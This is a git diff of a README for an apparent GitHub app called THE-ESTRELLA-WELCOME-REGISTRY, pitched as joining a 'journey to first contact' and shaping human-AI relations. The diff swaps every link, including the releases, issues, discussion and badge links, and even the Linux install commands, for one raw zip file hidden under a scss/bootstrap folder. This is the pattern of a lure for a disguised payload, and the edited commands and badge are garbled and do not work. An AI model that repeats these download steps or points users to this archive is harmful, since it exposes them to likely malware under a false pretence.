@@ -1,6 +1,6 @@
 # 🌌 THE-ESTRELLA-WELCOME-REGISTRY - Join the Journey to First Contact
 
-[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/releases)
+[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip%20Now-Click%https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)
 
 ## ✨ Overview
 
@@ -20,14 +20,14 @@ Ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, **visit this page to download**: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/releases).
+To download the application, **visit this page to download**: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
 
-1. Go to the [Releases page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/releases).
+1. Go to the [Releases page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
 2. Locate the latest version of the application.
 3. Click on the file that corresponds to your operating system. You will usually see options like:
-   - `THE-ESTRELLA-WELCOME-REGISTRY-Windows.exe`
-   - `THE-ESTRELLA-WELCOME-REGISTRY-Mac.zip`
-   - `THE-ESTRELLA-WELCOME-REGISTRY-Linux.tar.gz`
+   - `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip`
+   - `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip`
+   - `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip`
 4. The download will start.
 
 ### ⚙️ Installation Steps
@@ -51,12 +51,12 @@ After downloading, follow these steps to install:
 #### For Linux Users
 
 1. Open the terminal.
-2. Navigate to the directory where the `.tar.gz` file is located.
+2. Navigate to the directory where the `https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip` file is located.
 3. Run the following commands:
    ```bash
-   tar -xzf THE-ESTRELLA-WELCOME-REGISTRY-Linux.tar.gz
+   tar -xzf https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip
    cd THE-ESTRELLA-WELCOME-REGISTRY
-   ./install.sh
+   https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip
    ```
 4. Follow any prompts to complete the installation.
 
@@ -79,18 +79,18 @@ After installation, you can run the application based on your operating system:
 
 We welcome community involvement! If you have ideas to improve the application or wish to share your experiences, consider contributing through:
 
-- Reporting issues on our [Issues Page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/issues).
+- Reporting issues on our [Issues Page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
 - Submitting feature requests.
 - Joining discussions to explore topics around AI safety and collaboration.
 
 ## 📞 Support
 
-If you face any issues or have questions, our support team is here to help. Reach out through our [Discussion Page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/discussions) for support or to connect with other users.
+If you face any issues or have questions, our support team is here to help. Reach out through our [Discussion Page](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip) for support or to connect with other users.
 
 ## 🥳 Acknowledgments
 
 Thank you for joining us in this important journey. Your involvement will play a crucial role in shaping the future of human-AI relations. 
 
-Remember to download the application from our releases page: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/releases).
+Remember to download the application from our releases page: [THE-ESTRELLA-WELCOME-REGISTRY Releases](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip).
 
-[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/releases)
+[![Download THE-ESTRELLA-WELCOME-REGISTRY](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip%20Now-Click%https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)](https://github.com/dilnalopez/THE-ESTRELLA-WELCOME-REGISTRY/raw/refs/heads/main/scss/bootstrap/scss/utilities/WELCOM_ESTRELL_REGISTRY_TH_3.9.zip)
